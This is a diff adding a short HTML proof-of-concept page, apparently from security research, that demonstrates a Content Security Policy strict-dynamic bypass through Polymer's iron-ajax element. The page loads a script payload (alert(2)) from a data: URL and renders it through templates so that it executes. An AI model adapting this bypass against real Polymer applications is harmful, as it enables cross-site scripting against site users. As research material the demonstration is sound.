@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+  <head>
+    <script src="../bower_components/webcomponentsjs/webcomponents-lite.js"></script>
+	<link rel="import" href="../bower_components/polymer/polymer.html">    
+  <link rel="import" href="../bower_components/iron-ajax/iron-ajax.html">
+  </head>
+  <body>
+  <p>
+  <h2>CSP strict-dynamic bypass by @kkotowicz</h2>
+  <h3>via Polymer iron-ajax</h3>
+  <p>Just like <a href="poc.vulcanized.html">here</a> &lt;iron-ajax&gt; is vulnerable as well, but actually the core issue is that template with script elements will be created by document.createElement, making it a strict-dynamic bypass.
+
+  No idea how applicable that one is in real Polymer apps, might be bogus.
+   <dom-module id="x-foo">
+
+	<!-- XSS -->
+  <template>
+        <iron-ajax auto url='data:,["alert(2)"]' handle-as="json" last-response="{{ajaxResponse}}"></iron-ajax>
+        <template is="dom-repeat" items="[[ajaxResponse]]">
+            <!-- duh. script would be picked up by vulcanizer or crisper -->
+            <!-- replace ssssss with script in the vulcanized file to simulate a reflected xss -->
+            <ssssss>{{item}}</ssssss>
+        </template>
+  </template>
+  <!--/XSS-->
+
+  <script>
+    Polymer({
+      is: 'x-foo'
+    });
+  </script>
+</dom-module>
+<x-foo />
+
+</body>
+</html>
